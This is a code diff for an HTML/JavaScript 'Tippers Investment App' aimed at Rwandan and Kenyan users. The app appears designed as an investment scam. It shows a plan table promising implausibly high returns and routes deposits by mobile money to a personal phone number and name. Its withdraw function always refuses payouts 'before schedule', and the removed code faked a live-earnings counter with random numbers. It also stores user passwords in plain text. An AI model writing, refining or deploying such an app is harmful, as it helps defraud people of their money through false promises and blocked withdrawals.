@@ -35,9 +35,11 @@ height:520px;
 overflow-y:auto;
 }
 
+/* TITLES */
 .title{color:#f59e0b;text-align:center;font-weight:bold;}
 .desc{text-align:center;margin-top:10px;}
 
+/* INPUT */
 input,select{
 width:100%;
 padding:10px;
@@ -48,6 +50,7 @@ background:#0f172a;
 color:white;
 }
 
+/* BUTTON */
 button{
 width:100%;
 padding:12px;
@@ -60,8 +63,7 @@ font-weight:bold;
 cursor:pointer;
 }
 
-.row{display:flex;gap:5px;}
-
+/* NAV */
 .nav{
 display:flex;
 justify-content:space-around;
@@ -69,9 +71,25 @@ background:#020617;
 padding:10px;
 }
 
-.nav div{text-align:center;cursor:pointer;}
-.nav i{display:block;font-size:20px;margin-bottom:3px;}
+.nav div{
+text-align:center;
+cursor:pointer;
+opacity:0.5;
+}
 
+.nav i{
+display:block;
+font-size:20px;
+margin-bottom:3px;
+}
+
+/* ACTIVE NAV */
+.active{
+opacity:1 !important;
+color:#f59e0b;
+}
+
+/* TOAST */
 #toast{
 position:fixed;
 bottom:20px;
@@ -84,6 +102,7 @@ border-radius:8px;
 display:none;
 }
 
+/* CARD */
 .card{
 background:#111;
 padding:15px;
@@ -91,20 +110,45 @@ border-radius:12px;
 margin-top:10px;
 }
 
+/* PLAN TABLE */
+.plan{
+margin-top:10px;
+border-radius:10px;
+overflow:hidden;
+}
+
+.rowPlan{
+display:grid;
+grid-template-columns:repeat(7,1fr);
+padding:8px;
+font-size:11px;
+}
+
+.headerRow{
+background:#f59e0b;
+color:black;
+font-weight:bold;
+}
+
+.rowPlan:nth-child(even){background:#111;}
+.rowPlan:nth-child(odd){background:#0f172a;}
+
 </style>
 </head>
 
 <body>
 
 <div class="app">
+
 <div class="content" id="screen"></div>
 
-<div class="nav" id="nav" style="display:none">
-<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
-<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
-<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
-<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
+<div class="nav" id="nav">
+<div onclick="home()" id="navHome"><i class="fa fa-home"></i>HOME</div>
+<div onclick="deposit()" id="navDeposit"><i class="fa fa-wallet"></i>DEPOSIT</div>
+<div onclick="earn()" id="navEarn"><i class="fa fa-chart-line"></i>EARN</div>
+<div onclick="withdraw()" id="navWithdraw"><i class="fa fa-money-bill"></i>WITHDRAW</div>
 </div>
+
 </div>
 
 <div id="toast"></div>
@@ -119,7 +163,6 @@ let amount = 0;
 let selectedPeriod = 0;
 
 const screen=document.getElementById("screen");
-const nav=document.getElementById("nav");
 
 /* TOAST */
 function toast(msg){
@@ -129,10 +172,17 @@ t.style.display="block";
 setTimeout(()=>t.style.display="none",2500);
 }
 
+/* LOCK NAV */
+function lockCheck(){
+if(!depositDone){
+toast("Finish deposit first ❌");
+return false;
+}
+return true;
+}
+
 /* START */
 function start(){
-nav.style.display="none";
-
 screen.innerHTML=`
 <h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
 <p class="desc">Start now and grow your income smartly.</p>
@@ -155,7 +205,7 @@ screen.innerHTML=`
 <option>Female</option>
 </select>
 
-<div class="row">
+<div style="display:flex;gap:5px">
 <select id="code">
 <option value="+250">RWA +250</option>
 <option value="+254">KEN +254</option>
@@ -171,7 +221,7 @@ screen.innerHTML=`
 `;
 }
 
-/* REGISTER VALIDATION */
+/* REGISTER */
 function doRegister(){
 
 if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
@@ -190,16 +240,10 @@ if(pass.value!==cpass.value){
 toast("Passwords do not match ❌"); return;
 }
 
-/* SAVE */
-let user={
-email:email.value,
-pass:pass.value
-};
-
-users.push(user);
+users.push({email:email.value,pass:pass.value});
 localStorage.setItem("users",JSON.stringify(users));
 
-toast("Registered successfully ✔");
+toast("Registered ✔");
 login();
 }
 
@@ -221,63 +265,55 @@ screen.innerHTML=`
 `;
 }
 
-/* LOGIN VALIDATION */
+/* LOGIN */
 function doLogin(){
 
 if(!le.value||!lp.value){
 toast("Fill all fields ❌"); return;
 }
 
-let user=users.find(u=>u.email===le.value);
+let u=users.find(x=>x.email===le.value);
 
-if(!user){
+if(!u){
 toast("Account not found ❌"); return;
 }
 
-if(lp.value!==user.pass){
+if(lp.value!==u.pass){
 toast("Invalid password ❌"); return;
 }
 
-currentUser=user;
-nav.style.display="flex";
+currentUser=u;
 
-deposit();
+/* SHOW PLAN FIRST */
+showPlan();
 }
 
-/* FORGOT PASSWORD */
-function forgot(){
+/* PLAN */
+function showPlan(){
 screen.innerHTML=`
 
-<h3 class="title">Reset Password</h3>
+<h3 class="title">TIPPERS INVESTMENT PLAN</h3>
 
-<input id="fe" placeholder="Enter your email">
-<input id="np" placeholder="New 6 digit password">
+<div class="plan">
 
-<button onclick="reset()">RESET</button>
+<div class="rowPlan headerRow">
+<div>INVEST</div>
+<div>2.2%</div>
+<div>3%</div>
+<div>3.6%</div>
+<div>4.1%</div>
+<div>5%</div>
+<div>7%</div>
+</div>
+
+<div class="rowPlan"><div>5k</div><div>110</div><div>1050</div><div>5400</div><div>9225</div><div>22500</div><div>42000</div></div>
+<div class="rowPlan"><div>50k</div><div>1100</div><div>10500</div><div>54000</div><div>92250</div><div>225000</div><div>420000</div></div>
+<div class="rowPlan"><div>100k</div><div>2200</div><div>21000</div><div>108000</div><div>184500</div><div>450000</div><div>840000</div></div>
+
+</div>
+
+<button onclick="deposit()">NEXT</button>
 `;
-}
-
-function reset(){
-
-if(!fe.value||!np.value){
-toast("Fill all fields ❌"); return;
-}
-
-let u=users.find(x=>x.email===fe.value);
-
-if(!u){
-toast("Email not found ❌"); return;
-}
-
-if(!/^[0-9]{6}$/.test(np.value)){
-toast("Password must be 6 digits ❌"); return;
-}
-
-u.pass=np.value;
-localStorage.setItem("users",JSON.stringify(users));
-
-toast("Password updated ✔");
-login();
 }
 
 /* DEPOSIT */
@@ -285,7 +321,6 @@ function deposit(){
 screen.innerHTML=`
 
 <h3 class="title">DEPOSIT BALANCE</h3>
-<p class="desc">Add funds using MTN mobile money</p>
 
 <input id="amt" placeholder="Amount (RWF)">
 <p>Minimum 5000 RWF</p>
@@ -302,13 +337,11 @@ if(!amt.value||!sender.value){
 toast("Fill all fields ❌"); return;
 }
 
-let a=parseInt(amt.value);
-
-if(a<5000){
-toast("Minimum is 5000 RWF ❌"); return;
+if(parseInt(amt.value)<5000){
+toast("Minimum 5000 ❌"); return;
 }
 
-amount=a;
+amount=parseInt(amt.value);
 payment();
 }
 
@@ -319,11 +352,7 @@ screen.innerHTML=`
 <h3 class="title">PAYMENT INFORMATION</h3>
 
 <div class="card">
-0795410739
-
-<br><br>
-
-BARAKA BOLINGO
+0795410739<br><br>BARAKA BOLINGO
 </div>
 
 <button onclick="dial()">DIAL & PAY</button>
@@ -370,110 +399,51 @@ screen.innerHTML=`
 `;
 }
 
-/* PROFIT */
-function calculateProfit(a,p){
-
-let rate=0;
-
-if(p==1) rate=0.05;
-if(p==7) rate=0.2;
-if(p==14) rate=0.45;
-if(p==45) rate=1.2;
-if(p==90) rate=3;
-if(p==120) rate=11;
-
-return Math.floor(a + (a*rate));
-}
-
 /* FINISH */
 function finish(){
-selectedPeriod=period.value;
 depositDone=true;
 
-let finalAmount=calculateProfit(amount,selectedPeriod);
-
 screen.innerHTML=`
-
 <div class="card">
-<h2 class="title">Final Balance</h2>
-<h1>${finalAmount} RWF</h1>
-<p class="desc">Your profit is locked</p>
+<h2 class="title">Deposit Completed</h2>
+<p class="desc">Now you can use dashboard</p>
 </div>
 `;
-}
-
-/* EARN */
-function earn(){
-
-screen.innerHTML=`
-<h3 class="title">Live Earnings</h3>
-<div class="card">
-<h1 id="live">0 RWF</h1>
-</div>
-`;
-
-let i=0;
-setInterval(()=>{
-i+=Math.floor(Math.random()*2000);
-document.getElementById("live").innerText=i+" RWF";
-},1000);
 }
 
 /* HOME */
 function home(){
-if(!depositDone){
-toast("Finish deposit first ❌"); return;
+if(!lockCheck()) return;
+
+screen.innerHTML=`<div class="card">Welcome Home</div>`;
 }
 
-let finalAmount=calculateProfit(amount,selectedPeriod);
+/* EARN */
+function earn(){
+if(!lockCheck()) return;
 
-screen.innerHTML=`
-<div class="card">
-<h2 class="title">Balance</h2>
-<h1>${finalAmount} RWF</h1>
-</div>
-`;
+screen.innerHTML=`<div class="card">Live Earnings Running...</div>`;
 }
 
 /* WITHDRAW */
 function withdraw(){
-
-if(!depositDone){
-toast("Finish deposit first ❌"); return;
-}
+if(!lockCheck()) return;
 
 screen.innerHTML=`
 
-<h3 class="title">WITHDRAW</h3>
-
 <input id="wamt" placeholder="0 RWF">
-<p>Minimum 7500 RWF</p>
-
-<div class="row">
-<select>
-<option>RWA +250</option>
-<option>KEN +254</option>
-</select>
-<input id="wphone">
-</div>
+<p>Minimum 7500</p>
 
 <button onclick="doWithdraw()">WITHDRAW</button>
 `;
 }
 
 function doWithdraw(){
-
-if(!wamt.value){
-toast("Enter amount ❌"); return;
-}
-
-let w=parseInt(wamt.value);
-
-if(w<7500){
+if(!wamt.value||wamt.value<7500){
 toast("INVALID INPUT ❌"); return;
 }
 
-toast("You're not allowed to withdraw before the locked schedule.");
+toast("You're not allowed to withdraw before schedule.");
 }
 
 /* START */
